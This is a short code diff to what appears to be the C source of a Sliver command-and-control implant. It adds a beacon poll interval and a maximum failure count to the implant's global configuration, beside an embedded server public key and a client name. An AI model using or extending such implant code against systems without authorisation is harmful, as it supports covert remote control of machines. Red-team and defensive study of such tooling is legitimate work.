@@ -1701,6 +1701,8 @@ VOID Final(VOID)
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
 	UINT64 uEncoderNonce = 6979;
 	CHAR szSliverClientName[32] = "ELDEST_ECONOMICS";
+	DWORD dwPollInterval = 2;
+	DWORD dwMaxFailure = 5;
 	GLOBAL_CONFIG GlobalConfig;
 #ifdef __BEACON__
 	PSLIVER_BEACON_CLIENT pBeaconClient = NULL;
@@ -1720,6 +1722,8 @@ VOID Final(VOID)
 	GlobalConfig.lpServerMinisignPublicKey = DuplicateStrA(szServerMinisignPubkey, 0);
 	GlobalConfig.uEncoderNonce = uEncoderNonce;
 	lstrcpyA(GlobalConfig.szSliverName, szSliverClientName);
+	GlobalConfig.dwPollInterval = dwPollInterval;
+	GlobalConfig.dwMaxFailure = dwMaxFailure;
 
 #ifdef __BEACON__
 	pBeaconClient = BeaconInit(&GlobalConfig);
